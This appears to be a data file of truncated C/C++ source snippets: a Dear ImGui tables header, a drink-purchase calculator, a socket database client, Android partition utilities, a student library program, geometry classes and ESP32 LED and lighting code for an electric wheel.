    "// dear imgui, v1.91.0 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from win",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n//Programa de compra de maltas y refrescos\r\n\r\nint main() {\r\n\r\nint bucle=1;\r\n    string razonSocial;\r\n    string rifCedula;\r\n    int cantidadRefrescos, cantidadMaltas;\r\n\r\n    const float precioRefrescoDetal = 10.0;\r\n    const float precioRefrescoMayor = 5.0;\r\n    const float precioMaltasDetal = 12.0;\r\n    const float precioMaltasMayor = 7.0;\r\n    const int cantidadMinimaMayor = 6;\r\n   \r\n    while (bucle == 1){\r\n\r\n\r\n    cout << \"Ingrese la raz\u00f3n social del cliente: \";\r\n    getline(cin, razonSocial);\r\n    cout << \"Ingrese el RIF/C\u00e9dula del cliente: \";\r\n    getline(cin, rifCedula);\r\n\r\n    cout << \"Ingrese la cantidad de refrescos a comprar: \";\r\n    cin >> cantidadRefrescos;\r\n    cout << \"Ingrese la cantidad de maltas a comprar: \";\r\n    cin >> cantidadMaltas;\r\n\r\n    // Calcular monto total por tipo de producto'\r\n    float totalRefrescos;\r\n    if (cantidadRefrescos >= cantidadMinimaMayor) {\r\n        totalRefrescos = cantidadRefrescos * precioRefrescoMayor;\r\n    } else {\r\n        totalRefrescos = cantidadRefrescos * precioRefrescoDetal;\r\n    }\r\n\r\n    float totalMaltas;\r\n    if (cantidadMaltas >= cantidadMinimaMayor) {\r\n        totalMaltas = cantidadMaltas * precioMaltasMayor;\r\n    } else {\r\n        totalMaltas = cantidadMaltas * precioMaltasDetal;\r\n    }\r\n\r\n    // Calcular monto total a pagar\r\n    float montoTotal = totalRefrescos + totalMaltas;\r\n\r\n    cout << \"\\n--- Resumen de compra ---\\n\";\r\n    cout << \"Cliente: \" << razonSocial << endl;\r\n    cout << \"RIF/C\u00e9dula: \" << rifCedula << endl;\r\n    cout << \"Total a pagar por refrescos: $\" << totalRefrescos << endl;\r\n    cout << \"Total a pagar por maltas: $\" << totalMaltas << endl;\r\n    cout << \"Monto total a pagar: $\" << montoTotal << endl;\r\n}\r\n\r\n     return 0;\r\n}",
    "//\n// Created by amir on 01.07.24.\n//\n\n#include \"../include/database_client.h\"\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <stdexcept>\n#include <iostream>\n#include <cstring>\n#include <sstream>\n#include <vector>\n\nstd::vector<std::vector<std::string>> DatabaseClient::execute_query(const std::string& query) {\n    try {\n        connect_to_server();\n        send_query(query);\n        return receive_results();\n    } catch (const std::exception& e) {\n        std::cerr << \"Error executing query: \" << e.what() << std::endl;\n        return {};\n    }\n}\n\nvoid DatabaseClient::connect_to_server() {\n    sockaddr_in serv_addr;\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(server_port);\n\n    if (inet_pton(AF_INET, server_ip.c_str(), &serv_addr.sin_addr) <= 0) {\n        throw std::runtime_error(\"Invalid address / Address not supported\");\n    }\n\n    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n        throw std::runtime_error(\"Connection failed: \" + std::string(strerror(errno)));\n    }\n}\n\nvoid DatabaseClient::send_query(const std::string& query) {\n    int total_sent = 0;\n    int remaining = query.length();\n    const char* ptr = query.c_str();\n\n    while (total_sent < query.length()) {\n        int sent = send(sock, ptr + total_sent, remaining, 0);\n        if (sent < 0) {\n            throw std::runtime_error(\"Error sending query: \" + std::string(strerror(errno)));\n        }\n        total_sent += sent;\n        remaining -= sent;\n    }\n}\n\nstd::vector<std::vector<std::string>> DatabaseClient::receive_results() {\n    std::string response;\n    char buffer[1024];\n    int bytes_received;\n\n    while ((bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {\n        buffer[bytes_received] = '\\0';\n        response += buffer;\n\n        if (bytes_received < sizeof(buffer) - 1) {\n            break;\n        }\n    }\n\n    if (bytes_received < 0) {\n        throw std::runtime_error(\"Error receiving results: \" + std::string(strerror(errno)));\n    }\n\n    if (response.substr(0, 6) == \"Error:\") {\n        throw std::runtime_error(response.substr(7));\n    }\n\n    return deserialize_results(response);\n}\n\nDatabaseClient::DatabaseClient(const std::string& ip, int port) : server_ip(ip), server_port(port) {\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock < 0) {\n        throw std::runtime_error(\"Failed to create socket\");\n    }\n}\n\nDatabaseClient::~DatabaseClient() {\n    close(sock);\n}\n\nstd::vector<std::vector<std::string>> DatabaseClient::deserialize_results(const std::string& serialized) {\n    std::vector<std::vector<std::string>> results;\n    std::istringstream iss(serialized);\n    std::string line;\n\n    while (std::getline(iss, line)) {\n        std::vector<std::string> row;\n        std::istringstream line_stream(line);\n        std::string value;\n\n        while (std::getline(line_stream, value, '|')) {\n            if (!value.empty()) {\n                row.push_back(value);\n            }\n        }\n\n        if (!row.empty()) {\n            results.push_back(row);\n        }\n    }\n\n    return results;\n}",
    "/*\n * Copyright (c) 2013,2016, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n#define _LARGEFILE64_SOURCE /* enable lseek64() */\n\n/******************************************************************************\n * INCLUDE SECTION\n ******************************************************************************/\n#include <fcntl.h>\n#include <string.h>\n#include <errno.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include \"ioctl.h\"\n#include \"ufs.h\"\n#include <unistd.h>\n#include <linux/fs.h>\n#include <limits.h>\n#include <dirent.h>\n#include <linux/kernel.h>\n#include <map>\n#include <vector>\n#include <string>\n#ifndef __STDC_FORMAT_MACROS\n#define __STDC_FORMAT_MACROS\n#endif\n#include <inttypes.h>\n\n\n#define LOG_TAG \"gpt-utils\"\n#include <log/log.h>\n#include <cutils/properties.h>\n#include \"gpt-utils.h\"\n#include <zlib.h>\n#include <endian.h>\n\n\n/******************************************************************************\n * DEFINE SECTION\n ******************************************************************************/\n#define BLK_DEV_FILE    \"/dev/block/mmcblk0\"\n/* list the names of the backed-up partitions to be swapped */\n/* extension used for the backup partitions - tzbak, abootbak, etc. */\n#define BAK_PTN_NAME_EXT    \"bak\"\n#define XBL_PRIMARY         \"/dev/block/bootdevice/by-name/xbl\"\n#define XBL_BACKUP          \"/dev/block/bootdevice/by-name/xblbak\"\n#define XBL_AB_PRIMARY      \"/dev/block/bootdevice/by-name/xbl_a\"\n#define XBL_AB_SECONDARY    \"/dev/block/bootdevice/by-name/xbl_b\"\n/* GPT defines */\n#define MAX_LUNS                    26\n//Size of the buffer that needs to be passed to the UFS ioctl\n#define UFS_ATTR_DATA_SIZE          32\n//This will allow us to get the root lun path from the path to the partition.\n//i.e: from /dev/block/sdaXXX get /dev/block/sda. The assumption here is that\n//the boot critical luns lie between sda to sdz which is acceptable because\n//only user added external disks,etc would lie beyond that limit which do not\n//contain partitions that interest us here.\n#define PATH_TRUNCATE_LOC (sizeof(\"/dev/block/sda\") - 1)\n\n//From /dev/block/sda get just sda\n#define LUN_NAME_START_LOC (sizeof(\"/dev/block/\") - 1)\n#define BOOT_LUN_A_ID 1\n#define BOOT_LUN_B_ID 2\n/******************************************************************************\n * MACROS\n ******************************************************************************/\n\n\n#define GET_4_BYTES(ptr)    ((uint32_t) *((uint8_t *)(ptr)) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 1) << 8) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 2) << 16) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 3) << 24))\n\n#define GET_8_BYTES(ptr)    ((uint64_t) *((uint8_t *)(ptr)) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 1) << 8) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 2) << 16) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 3) << 24) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 4) << 32) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 5) << 40) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 6) << 48) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 7) << 56))\n\n#define PUT_4_BYTES(ptr, y)   *((uint8_t *)(ptr)) = (y) & 0xff; \\\n        *((uint8_t *)(ptr) + 1) = ((y) >> 8) & 0xff; \\\n        *((uint8_t *)(ptr) + 2) = ((y) >> 16) & 0xff; \\\n        *((uint8_t *)(ptr) + 3) = ((y) >> 24) & 0xff;\n\n/******************************************************************************\n * TYPES\n ******************************************************************************/\nusing namespace std;\nenum gpt",
    "#include<fstream>\r\n#include<conio.h>\r\n#include<string.h>\r\n#include<iomanip>\r\n#include<iostream>\r\nusing namespace std;\r\n\r\nfstream fp,fp1;//filing\r\n\r\nvoid book_menu();\r\nvoid student_menu();\r\nvoid issue_book();\r\nvoid book_return();\r\nvoid write_student();\r\nvoid book_return();\r\nint fines();\r\nvoid display_all_students();\r\nstatic int stock=100; \r\n\r\nclass book\r\n{\r\n    char book_number[30];\r\n    char book_name[50];\r\n    char author_name[20];\r\n    char book_nu[10];\r\n    \r\n  \tpublic:\r\n  \t\t\r\n        void create_book()\r\n        {\r\n            cout<<\"\\nEnter Book Number: \";\r\n            cin>>book_number;\r\n            cout<<\"\\nEnter Name of The Book: \";\r\n            cin.ignore();\r\n            cin.getline(book_name,50);\r\n            cout<<\"\\nEnter Author's Name: \";\r\n            cin.getline(author_name,50);\r\n           \tcout<<\"\\nEnter Stock\";\r\n\t\t\tcin.getline(book_nu,10); \r\n\t\t    cout<<\"\\t\\t\\n\\nBook Created Successfully\";\r\n            system(\"cls\");\r\n            \r\n\t\t}\r\n \r\n        void show_book()\r\n        {\r\n        \tcout<<\"\\nBook Number: \"<<book_number;\r\n            cout<<\"\\nBook Name: \"<<book_name;\r\n            cout<<\"\\nAuthor's Name: \"<<author_name;\r\n        }\r\n        \r\n        void modify_book()\r\n        {\r\n            cout<<\"\\nBook number : \"<<book_number;\r\n            cout<<\"\\nModify Book Name : \";\r\n            cin.ignore();\r\n            cin.getline(book_name,50);\r\n            cout<<\"\\nModify Author's Name: \";\r\n            cin.ignore();\r\n            cin.getline(author_name,50);\r\n            cout<<\"\\nModify Stock:\";\r\n            cin.getline(book_nu,10);\r\n        }\r\n        \r\n        char* getbooknumber()\r\n        {\r\n            return book_number;\r\n        }\r\n          \r\n\t\tvoid report()\r\n        {\r\n\t\t\tcout << book_number << setw(30) << book_name <<setw (30) << author_name << endl;\r\n\t\t}\r\n\t\t\r\n \t\tvoid getstock()\r\n\t\t{\r\n \t\t\tcout<< stock;;\r\n\t\t}\r\n};               \r\n\r\nclass admin: public book\r\n{\r\n\tint option;\r\n\t\r\n\tpublic: \r\n\t\r\n\t\r\n\tint passwordforAdmin()\r\n\t{\r\n\t\tstring pass1 =\"\";\r\n    \tchar ch1;\r\n    \tcout << \"ENTER ADMIN PASSWORD: \";\r\n    \tch1 = _getch();\r\n    \t\r\n    \twhile(ch1 != 13)\r\n\t\t{\r\n      \t\tpass1.push_back(ch1);\r\n      \t\tcout << '*';\r\n      \t\tch1 = _getch();\r\n      \t\t\r\n    \t}\r\n    \t\tsystem(\"cls\");\r\n    \t\r\n    \tif(pass1 == \"admin\" || pass1 == \"ADMIN\")\r\n\t\t{\r\n\t\t\tfor(;;)\r\n\t\t\t{\r\n\t\t\t\r\n      \t\tcout << \"\\n\\n\\t\\t\\tADMIN MENU\";\r\n      \t\tcout << \"\\n\\n\\tPRESS 1) BOOK MENU\\n\\tPRESS 2) STUDENT MENU\\n\\tPRESS 3) EXIT\\n\\n\\tOPTION: \";\r\n      \t\tcin >> option;\r\n      \t\t\r\n      \t\tif(option == 1)\r\n\t\t\t{\r\n\t\t\t  book_menu();\t\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse if (option == 2)\r\n\t\t\t{\r\n\t\t\t\tstudent_menu();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse if (option == 3)\r\n\t\t\t{\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse \r\n\t\t\t{\r\n\t\t\t\tcout << \"INVALID CHOICE ENTERED! \";\r\n\t\t\t}\r\n    \t}\r\n    \t}\r\n    \telse \r\n\t\t{\r\n\t\t\tcout << \"INCORRECT PASSWORD!\";\r\n\t\t}\r\n    }\r\n};\r\n \r\nclass student: public book\r\n{\r\n    char ID_number[20];\r\n    char Student_name[20];\r\n    char stbno[6];\r\n    int token;\r\n    int option;\r\n    \r\n\tpublic:\r\n\t\t\r\n\t\tint passwordforstudent()\r\n\t\t{\r\n\t\t\tstring pass =\"\";\r\n   \t\t\tchar ch;\r\n   \t\t\t\r\n   \t\t\tcout << \"ENTER STUDENT PASSWORD: \";\r\n   \t\t\tch = _getch();\r\n   \t\t\t\r\n   \t\t\twhile(ch != 13)\t\r\n\t\t\t{\r\n      \t\t\tpass.push_back(ch);\r\n      \t\t\tcout << '*';\r\n      \t\t\tch = _getch();\r\n   \t\t\t}\r\n   \t\t\t\r\n   \t\t\tsystem(\"cls\");\r\n   \t\t\t\r\n   \t\t\tif(pass == \"fahad\")\r\n\t\t\t{\r\n      \t\t\tfor(;;)\r\n\t\t\t\t{\r\n\t\t\t\r\n      \t\tcout << \"\\n\\n\\t\\t\\tSTUDENT MENU\";\r\n      \t\tcout << \"\\n\\n\\tPRESS 1) ISSUE BOOK\\n\\tPRESS 2) RETURN BOOK\\n\\tPRESS 3) EXIT\\n\\n\\tOPTION: \";\r\n      \t\tcin >> option;\r\n      \t\t\r\n      \t\tif(option == 1)\r\n\t\t\t{\r\n\t\t\t  \tissue_book();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse if (option == 2)\r\n\t\t\t{\r\n\t\t\t\tbook_return(); \r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse if (option == 3)\r\n\t\t\t{\r\n\t\t\t\tbreak;\t\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse \r\n\t\t\t{\r\n\t\t\t\tcout << \"INVALID CHOICE ENTERED! \";\r\n\t\t\t\treturn 0;\r\n\t\t\t}\r\n\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n        void create_student()\r\n        {\r\n        \tcout<<\"\\nENTER ID: \";\r\n            cin>>ID_number;\r\n            cout<<\"\\nENTER STUDENT NAME: \";\r\n            cin>>Student_name;\r\n            token=0;\r\n            stbno[0]='/0';\r\n            cout<<\"\\t\\t\\n\\nSTUDENT RECORD CREATED SUCCESSFULLY!\";\r\n            system(\"cls\");\r\n//            write_student();\r\n        }\r\n        \r\n        void show_student()\r\n        {\r\n            cout<<\"\\nSTUDENT: \" <<ID_number;\r\n            cout<<\"\\nSTUDENT NAME: \";\r\n            puts(Student_name);\r\n            cout<<\"\\nNO OF BOOKS ISSUED: \"<<token;\r\n            \r\n            if(token==1)\r\n                cout<<\"\\nBook No \"<< stbno;\r\n        }\r\n        \r\n        void modify_student()\r\n        {\r\n            cout<<\"\\nSTUDENT ID: \" << ID_number;\r\n            cout<<\"\\nMODIFY STUDENT NAME: \";\r\n            cin.ignore();\r\n            cin.getline(Student_name,50);\r\n        }\r\n        \r\n        char* get_ID_number()\r\n        {\r\n            return ID_number;\r\n        }\r\n        \r\n        char* retstbno()\r\n        {\r\n            return stbno;\r\n    \t}\r\n    \t\r\n        int rettoken()\r\n        {\r\n            return token;\r\n        }\r\n        \r\n        void addtoken",
    "\ufeff#include <iostream>\n\nclass Figure\n{\nprotected:\n    std::string name;\n    int sides_count;\npublic:\n    Figure() {}\n    Figure(int sides_count)\n    {\n        name = \"Figure\";\n        this->sides_count = sides_count;\n    }\n    std::string get_name() { return name; }\n    int get_sides_count() { return sides_count; }\n\n    virtual void print_info()\n    {\n        std::cout << get_name() << \":\" << std::endl;\n        if (check()) { std::cout << \"Correct\" << std::endl; }\n        else { std::cout << \"Incorrect\" << std::endl; }\n        std::cout << \"Sides count: \" << get_sides_count() << std::endl;\n    }\n\n    virtual bool check()\n    {\n        if (sides_count == 0)\n        {\n            return true;\n        }\n        else { return false; }\n    }\n};\n\nclass Triangle : public Figure\n{\nprotected:\n    int a, b, c;\n    int A, B, C;\npublic:\n    int get_a() { return a; }\n    int get_b() { return b; }\n    int get_c() { return c; }\n    int get_A() { return A; }\n    int get_B() { return B; }\n    int get_C() { return C; }\n    Triangle() {}\n    Triangle(int sides_count, int a, int b, int c, int A, int B, int C)\n    {\n        name = \"Triangle\";\n        this->sides_count = sides_count;\n        this->a = a;\n        this->b = b;\n        this->c = c;\n        this->A = A;\n        this->B = B;\n        this->C = C;\n    }\n\n    void print_info() override\n    {\n        std::cout << std::endl;\n        Figure::print_info();\n        std::cout << \"Sides: a=\" << get_a()\n            << \" b=\" << get_b()\n            << \" c=\" << get_c() << std::endl;\n        std::cout << \"Angels: A=\" << get_A()\n            << \" B=\" << get_B()\n            << \" C=\" << get_C() << std::endl;\n    }\n\n    bool check() override\n    {\n        if ((sides_count == 3) && (A + B + C == 180))\n        {\n            return true;\n        }\n        else { return false; }\n    }\n};\n\nclass RightTriangle : public Triangle\n{\npublic:\n    RightTriangle(int sides_count, int a, int b, int c, int A, int B)\n    {\n        name = \"Right Triangle\";\n        this->sides_count = sides_count;\n        this->a = a;\n        this->b = b;\n        this->c = c;\n        this->A = A;\n        this->B = B;\n        C = 90;\n    }\n\n    bool check() override\n    {\n        if (Triangle::check() && C == 90)\n        {\n            return true;\n        }\n        else { return false; }\n    }\n};\n\nclass IsoscelesTriangle : public Triangle\n{\npublic:\n    IsoscelesTriangle(int sides_count, int a, int b, int A, int B)\n    {\n        name = \"Isosceles Triangle\";\n        this->sides_count = sides_count;\n        this->a = a;\n        this->b = b;\n        this->A = A;\n        this->B = B;\n        c = a;\n        C = A;\n    }\n\n    bool check() override\n    {\n        if (Triangle::check() && a == c && A == C)\n        {\n            return true;\n        }\n        else { return false; }\n    }\n};\n\nclass EquilateralTriangle : public Triangle\n{\npublic:\n    EquilateralTriangle(int sides_count, int a)\n    {\n        name = \"Equilateral Triangle\";\n        this->sides_count = sides_count;\n        this->a = a;\n        b = c = a;\n        A = B = C = 60;\n    }\n\n    bool check() override\n    {\n        if (Triangle::check() && b == c && c == a && A == 60 && B == 60 && C == 60)\n        {\n            return true;\n        }\n        else { return false; }\n    }\n};\n\nclass Quadrangle : public Triangle\n{\nprotected:\n    int d;\n    int D;\npublic:\n    Quadrangle() {}\n    Quadrangle(int sides_count, int a, int b, int c, int d, int A, int B, int C, int D)\n    {\n        name = \"Quadrangle\";\n        this->sides_count = sides_count;\n        this->a = a;\n        this->b = b;\n        this->c = c;\n        this->d = d;\n        this->A = A;\n        this->B = B;\n        this->C = C;\n        this->D = D;\n    }\n    int get_d() { return d; }\n    int get_D() { return D; }\n\n    void print_info() override\n    {\n        std::cout << std::endl;\n        Figure::print_info();\n        std::cout << \"Sides: a=\" << get_a()\n            << \" b=\" << get_b()\n            << \" c=\" << get_c()\n            << \" d=\" << get_d() << std::endl;\n        std::cout << \"Angels: A=\" << get_A()\n            << \" B=\" << get_B()\n            << \" C=\" << get_C()\n            << \" D=\" << get_D() << std::endl;\n\n    }\n\n    bool check() override\n    {\n        if (sides_count == 4 && A + B + C + D == 360)\n        {\n            return true;\n        }\n        else { return false; }\n    }\n};\n\nclass Parallelogram : public Quadrangle\n{\npublic:\n    Parallelogram() {}\n    Parallelogram(int sides_count, int a, int b, int A, int B)\n    {\n        name = \"Parallelogram\";\n        this->sides_count = sides_count;\n        this->a = a;\n        this->b = b;\n        this->A = A;\n        this->B = B;\n        c = a;\n        d = b;\n        C = A;\n        D = B;\n    }\n\n    bool check() override\n    {\n        if (Quadrangle::check() && a == c && b == d && A == C && B == D)\n        {\n            return true;\n        }\n        else { return false; }\n    }\n};\n\nclass Rectangle : public Parallelogram\n{\npublic:\n    Rectangle(int sides_count, int",
    "#include \"begode.h\"\n\nconstexpr const uint32_t LIGHT_MAX_PWM_DUTY = static_cast<uint32_t>(std::pow(2, LIGHT_PWM_RESOLUTION));\nconstexpr const uint32_t LIGHT_STILL_PWM_DUTY = static_cast<uint32_t>(std::round(LIGHT_MAX_PWM_DUTY * LIGHT_STILL_DUTY));\n\nBegode::Hardware::Hardware() : bIsFading(false) {}\n\nvoid Begode::Hardware::onSetup()\n{\n    gpio_set_direction(COOLER_PIN, GPIO_MODE_OUTPUT);\n#if !LIGHT_PWM\n    gpio_set_direction(LIGHT_PIN, GPIO_MODE_OUTPUT);\n#else\n    ledcAttach(LIGHT_PIN, LIGHT_PWM_FREQ, LIGHT_PWM_RESOLUTION);\n#endif\n    FastLED.addLeds<WS2811, LED_PIN, GRB>(this->leds, NUM_LEDS);\n    FastLED.addLeds<WS2811, BACK_LED_PIN, GRB>(this->back_leds, NUM_BACK_LEDS);\n    FastLED.setBrightness(LED_BRIGHTNESS);\n}\n\nvoid Begode::Hardware::processDisplay()\n{\n    this->displayData.setTemp(this->wheelData.temperature);\n    this->displayData.setTotal(this->wheelData.total_distance);\n    this->displayData.setSpeed(static_cast<unsigned int>(std::round(this->wheelData.absSpeed)));\n    this->displayData.setPedalsMode(this->wheelData.pedalsMode);\n    this->displayData.setCharge(this->wheelData.battery);\n    this->display.update(&this->displayData);\n}\n\n#if !LIGHT_PWM\nvoid Begode::Hardware::processLight()\n{\n    static bool bLight, bPrevLight = false;\n\n    if (this->wheelData.absSpeed > MOVING_SPEED_THRESHOLD) bLight = true;\n    else bLight = (this->wheelData.lastMovingTime && ((this->wheelData.nowTime - this->wheelData.lastMovingTime) < LIGHT_OFF_DELAY));\n\n    if (bLight != bPrevLight)\n    {\n        if (!gpio_set_level(LIGHT_PIN, bLight))\n            bPrevLight = bLight;\n    }\n}\n#else\nvoid ARDUINO_ISR_ATTR Begode::Hardware::LIGHT_FADE_ISR()\n{\n    Begode::Hardware::Get().bIsFading = false;\n}\n\nvoid Begode::Hardware::processLight()\n{\n    static uint32_t previous_duty, target_duty = 0;\n\n    if (this->wheelData.absSpeed > MOVING_SPEED_THRESHOLD) target_duty = LIGHT_MAX_PWM_DUTY;\n    else target_duty = (this->wheelData.lastMovingTime && ((this->wheelData.nowTime - this->wheelData.lastMovingTime) < LIGHT_OFF_DELAY)) ? LIGHT_STILL_PWM_DUTY : 0;\n\n    if (!this->bIsFading && (target_duty != previous_duty))\n    {\n        if (ledcFadeWithInterrupt(LIGHT_PIN, previous_duty, target_duty, LIGHT_FADE_TIME, this->LIGHT_FADE_ISR))\n        {\n            this->bIsFading = true;\n            previous_duty = target_duty;\n        }\n    }\n}\n#endif\n\nvoid Begode::Hardware::processCooler() const\n{\n    static bool bCooler, bPrevCooler = false;\n\n    if (this->wheelData.absSpeed > MOVING_SPEED_THRESHOLD) bCooler = this->wheelData.temperature > TEMP_THRESHOLD_MOVE;\n    else\n    {\n        if (this->wheelData.temperature > TEMP_THRESHOLD_STILL_START)\n            bCooler = true;\n        else if (this->wheelData.temperature < TEMP_THRESHOLD_STILL_STOP)\n            bCooler = false;\n    }\n\n    if (bCooler != bPrevCooler)\n    {\n        if (!gpio_set_level(COOLER_PIN, bCooler))\n            bPrevCooler = bCooler;\n    }\n}\n\nvoid Begode::Hardware::processLEDs(SemaphoreHandle_t& mtx)\n{\n    if (!xSemaphoreTake(mtx, portMAX_DELAY))\n        return;\n\n    float speed = this->wheelData.speed;\n    float absSpeed = this->wheelData.absSpeed;\n    float prevAbsSpeed = this->wheelData.prevAbsSpeed;\n    xSemaphoreGive(mtx);\n\n    constexpr const int brakeDiff = NUM_LEDS - NUM_BRAKE_LEDS;\n    constexpr const CRGB colorDarkRed(100, 0, 0);\n    static uint8_t startIndex = 0;\n    static unsigned long delay = 80;\n    static bool bBrakeState = true;\n    static bool bBraking = false;\n\n    bool bRainbow = (absSpeed > 2.f) && (absSpeed < 55.f);\n    uint8_t colorIndex = startIndex;\n\n    for (int i = 0; i < brakeDiff; ++i)\n    {\n        this->leds[i] = ColorFromPalette(bRainbow ? RainbowStripeColors_p : RainbowColors_p, colorIndex, 255, bRainbow ? NOBLEND : LINEARBLEND);\n        colorIndex -= 3;\n    }\n\n    if (((prevAbsSpeed - absSpeed) > BRAKE_LIGHT_TOLERANCE) || (bBraking && (absSpeed < prevAbsSpeed)))\n    {\n        bBraking = true;\n\n        if (delay >= 80)\n        {\n            delay = 0;\n            std::fill_n(&this->leds[brakeDiff], NUM_BRAKE_LEDS, bBrakeState ? CRGB::Red : CRGB::Black);\n            std::fill_n(this->back_leds, NUM_BACK_LEDS, bBrakeState ? CRGB::Red : CRGB::Black);\n            bBrakeState = !bBrakeState;\n        }\n        else delay += 20;\n    }\n    else\n    {\n        bBraking = false;\n        bBrakeState = true;\n        delay = 80;\n\n        for (int i = brakeDiff; i < NUM_LEDS; ++i)\n        {\n            this->leds[i] = ColorFromPalette(bRainbow ? RainbowStripeColors_p : RainbowColors_p, colorIndex, 255, bRainbow ? NOBLEND : 